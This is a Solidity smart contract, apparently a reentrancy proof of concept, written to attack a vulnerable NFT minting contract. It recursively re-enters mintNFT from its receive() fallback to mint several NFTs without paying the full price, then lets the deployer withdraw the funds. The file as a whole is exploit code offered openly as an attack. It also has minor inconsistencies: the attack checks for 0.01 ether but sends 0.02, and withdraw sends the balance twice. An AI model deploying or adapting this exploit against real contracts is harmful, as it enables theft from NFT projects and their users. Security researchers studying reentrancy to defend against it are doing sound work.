// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @dev A contract designed to exploit a reentrancy vulnerability in a target NFT contract.
 * It mints multiple NFTs without paying the full cost by recursively calling mintNFT().
 */
interface IMyNFT {
    ///@dev Allows users to mint an NFT.
    function mintNFT(string memory _tokenURI) external payable;
}

contract AttackNFT is IERC721Receiver {
    IMyNFT public target; // The target NFT contract to attack
    address public owner; // The attacker who deploys this contract
    uint256 public attackCount; // Counter to track the number of reentrant calls

    /**
     * @dev Sets the target NFT contract and assigns the owner.
     * @param _target Address of the vulnerable NFT contract.
     */
    constructor(address _target) {
        target = IMyNFT(_target);
        owner = msg.sender;
    }

    /**
     * @dev ERC721 receiver function, required to accept NFT transfers.
     * This is needed when the contract receives NFTs.
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }

    /**
     * @dev Initiates the attack by minting the first NFT.
     * The contract should have at least 0.01 ether to start the attack.
     */
    function Attack() external payable {
        require(msg.value >= 0.01 ether, "Not enough ETH to attack");
        attackCount = 0;
        target.mintNFT{value: 0.02 ether}("maliciousURI"); // Triggers the reentrant call
    }

    /**
     * @dev Fallback function that is triggered when receiving ether.
     * This function exploits the reentrancy vulnerability by repeatedly minting NFTs.
     */
    receive() external payable {
        if (attackCount < 5) {
            // Limits the number of recursive calls to prevent infinite loops
            attackCount++;
            target.mintNFT{value: 0.02 ether}("maliciousURI"); // Reentering the mint function
        }
    }

    /**
     * @dev Allows the attacker to withdraw all ether from the contract.
     * Only the owner can call this function.
     */
    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
        (bool hacked, ) = address(owner).call{value: address(this).balance}("");
        require(hacked, "withdraw failed");
    }
}
